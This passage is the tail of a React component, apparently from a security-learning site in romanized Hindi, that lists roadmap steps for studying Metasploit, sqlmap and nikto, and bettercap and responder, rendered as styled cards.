          { step: '6', title: 'Metasploit', desc: 'Exploitation framework seekhein — payloads, exploits, post-exploitation' },
          { step: '7', title: 'sqlmap / nikto', desc: 'Web application testing seekhain' },
          { step: '8', title: 'bettercap / responder', desc: 'Advanced network attacks — MITM, poisoning' },
        ].map(item => (
          <div key={item.step} className="flex items-start space-x-4 glass-card p-4">
            <div className="flex-shrink-0 w-10 h-10 bg-neon-green/10 border border-neon-green/30 rounded-full flex items-center justify-center text-neon-green font-heading font-bold">
              {item.step}
            </div>
            <div>
              <h4 className="text-white font-mono font-semibold">{item.title}</h4>
              <p className="text-gray-500 text-sm">{item.desc}</p>
            </div>
          </div>
        ))}
      </div>
    </TutorialLayout>
  )
}
